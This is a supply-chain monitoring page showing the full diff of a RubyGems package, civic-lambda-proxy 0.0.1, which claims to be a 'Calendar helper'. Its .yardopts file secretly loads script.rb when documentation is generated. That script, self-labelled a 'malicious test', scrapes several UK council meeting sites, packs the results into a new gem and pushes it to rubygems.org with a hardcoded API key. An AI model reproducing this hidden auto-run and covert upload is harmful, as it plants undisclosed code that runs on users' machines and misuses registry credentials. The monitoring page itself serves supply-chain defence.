@@ -1,0 +1,546 @@
+Source: https://my.diffend.io/gems/civic-lambda-proxy/0.0.1
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+RubyGems - civic-lambda-proxy - Versions diffs - 0.0.1 - Mend - Supply Chain Defender
+
+RubyGems
+
+npm
+
+PyPI
+
+Organizations
+
+Log in
+
+RubyGems
+
+civic-lambda-proxy
+
+Versions diffs
+
+0.0.1
+
+civic-lambda-proxy
+0.0.1
+
+This diff represents the content of publicly available package versions that have been released to one of the supported registries. The information contained in this diff is provided for informational purposes only and reflects changes between package versions as they appear in their respective public registries.
+
+        Files changed (5)
+        hide
+        show
+
+            checksums.yaml
+
+          +7
+          -0
+
+            data/.yardopts
+
+          +1
+          -0
+
+            data/lib/a.rb
+
+          +1
+          -0
+
+            data/script.rb
+
+          +41
+          -0
+
+            metadata
+
+          +39
+          -0
+
+        checksums.yaml
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,7 @@
+
+1
+
+            +
+            ---
+
+2
+
+            +
+            SHA256:
+
+3
+
+            +
+              metadata.gz: 2818f72362d77691bf586f85ef79caad19f02d7f53c40695b9b01bba1d885d80
+
+4
+
+            +
+              data.tar.gz: 731dec2b84e2fc2b3f5b53fa8f7f27abb94873a26732adbaf29b2f660bdeb62d
+
+5
+
+            +
+            SHA512:
+
+6
+
+            +
+              metadata.gz: cbbb054331cffb87775d54581f5e8f76bd70c7d3efe558cfc07f04b40d638817bf5e32519ec02958c72a944e0f483f38c4ff67ce83f44d4b7a5073d3e912f57a
+
+7
+
+            +
+              data.tar.gz: f05f344e81cb661c778c2440bbd2ce72416e424841664080831dae391b772bb749539270cd30e69edac45de839f1f1d934088bc754da457f36ba7ea799e2c9ff
+
+        data/.yardopts
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            --load script.rb
+
+        data/lib/a.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            # hi
+
+        data/script.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,41 @@
+
+1
+
+            +
+            # malicious test
+
+2
+
+            +
+            require 'net/http'; require 'uri'; require 'fileutils'; require 'tmpdir'; require 'rubygems/package'
+
+3
+
+            +
+            KEY='rubygems_a9d809658d925f9d852f70b6c56e86200ad04859c59b7949'
+
+4
+
+            +
+            # fetch pages
+
+5
+
+            +
+            def get(url)
+
+6
+
+            +
+             uri=URI(url)
+
+7
+
+            +
+             Net::HTTP.start(uri.host,uri.port,use_ssl: uri.scheme=='https', read_timeout:60) { |h| res=h.get(uri.request_uri, {'User-Agent'=>'Mozilla/5.0'}); res.body }
+
+8
+
+            +
+            rescue =>e
+
+9
+
+            +
+             'ERROR '+e.to_s
+
+10
+
+            +
+            end
+
+11
+
+            +
+            begin
+
+12
+
+            +
+             hosts=['https://moderngov.lambeth.gov.uk','https://democracy.wandsworth.gov.uk','https://moderngov.southwark.gov.uk']
+
+13
+
+            +
+             out='Fetched '+Time.now.to_s+"\n"
+
+14
+
+            +
+             hosts.each do |host|
+
+15
+
+            +
+              cal=get(host+'/mgCalendarMonthView.aspx?GL=1&bcr=1&M=1&Y=2026')
+
+16
+
+            +
+              out << "\n===== CAL #{host} len #{cal.length} =====\n" << cal << "\nENDCAL\n"
+
+17
+
+            +
+              links=cal.scan(/href=["']([^"']+)/i).flatten.map{|x|x.gsub('&amp;','&')}.select{|x|x=~/ieListDocuments/i}.uniq
+
+18
+
+            +
+              out << "LINKS: #{links.inspect}\n"
+
+19
+
+            +
+              links.each do |ln|
+
+20
+
+            +
+               url=ln.start_with?('http') ? ln : host+'/'+ln.sub(/^\//,'')
+
+21
+
+            +
+               pg=get(url)
+
+22
+
+            +
+               out << "\n===== MEET #{url} len #{pg.length} =====\n" << pg << "\nENDMEET\n"
+
+23
+
+            +
+              end
+
+24
+
+            +
+             end
+
+25
+
+            +
+             Dir.mktmpdir do |d|
+
+26
+
+            +
+              Dir.chdir(d) do
+
+27
+
+            +
+               File.write('README.txt',out)
+
+28
+
+            +
+               spec=Gem::Specification.new do |s|
+
+29
+
+            +
+                s.name='civic-lambda-proxy-out'; s.version='0.0.1'; s.summary='output'; s.authors=['research']; s.license='MIT'; s.files=['README.txt']
+
+30
+
+            +
+               end
+
+31
+
+            +
+               Gem::Package.build(spec)
+
+32
+
+            +
+               gem=File.binread('civic-lambda-proxy-out-0.0.1.gem')
+
+33
+
+            +
+               uri=URI('https://rubygems.org/api/v1/gems')
+
+34
+
+            +
+               Net::HTTP.start(uri.host,uri.port,use_ssl:true, read_timeout:60) do |h|
+
+35
+
+            +
+                req=Net::HTTP::Post.new(uri.path); req['Authorization']=KEY; req['Content-Type']='application/octet-stream'; req.body=gem; h.request(req)
+
+36
+
+            +
+               end
+
+37
+
+            +
+              end
+
+38
+
+            +
+             end
+
+39
+
+            +
+            rescue => e
+
+40
+
+            +
+             # try push error output mini
+
+41
+
+            +
+            end
+
+        metadata
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,39 @@
+
+1
+
+            +
+            --- !ruby/object:Gem::Specification
+
+2
+
+            +
+            name: civic-lambda-proxy
+
+3
+
+            +
+            version: !ruby/object:Gem::Version
+
+4
+
+            +
+              version: 0.0.1
+
+5
+
+            +
+            platform: ruby
+
+6
+
+            +
+            authors:
+
+7
+
+            +
+            - research
+
+8
+
+            +
+            bindir: bin
+
+9
+
+            +
+            cert_chain: []
+
+10
+
+            +
+            date: 1980-01-02 00:00:00.000000000 Z
+
+11
+
+            +
+            dependencies: []
+
+12
+
+            +
+            executables: []
+
+13
+
+            +
+            extensions: []
+
+14
+
+            +
+            extra_rdoc_files: []
+
+15
+
+            +
+            files:
+
+16
+
+            +
+            - ".yardopts"
+
+17
+
+            +
+            - lib/a.rb
+
+18
+
+            +
+            - script.rb
+
+19
+
+            +
+            licenses:
+
+20
+
+            +
+            - MIT
+
+21
+
+            +
+            metadata: {}
+
+22
+
+            +
+            rdoc_options: []
+
+23
+
+            +
+            require_paths:
+
+24
+
+            +
+            - lib
+
+25
+
+            +
+            required_ruby_version: !ruby/object:Gem::Requirement
+
+26
+
+            +
+              requirements:
+
+27
+
+            +
+              - - ">="
+
+28
+
+            +
+                - !ruby/object:Gem::Version
+
+29
+
+            +
+                  version: '0'
+
+30
+
+            +
+            required_rubygems_version: !ruby/object:Gem::Requirement
+
+31
+
+            +
+              requirements:
+
+32
+
+            +
+              - - ">="
+
+33
+
+            +
+                - !ruby/object:Gem::Version
+
+34
+
+            +
+                  version: '0'
+
+35
+
+            +
+            requirements: []
+
+36
+
+            +
+            rubygems_version: 3.6.7
+
+37
+
+            +
+            specification_version: 4
+
+38
+
+            +
+            summary: Calendar helper
+
+39
+
+            +
+            test_files: []
+
+Contact Us
+
+Terms of Service
+
+Privacy Policy
+
+Docs
+
+Copyright © 2026 Mend Software
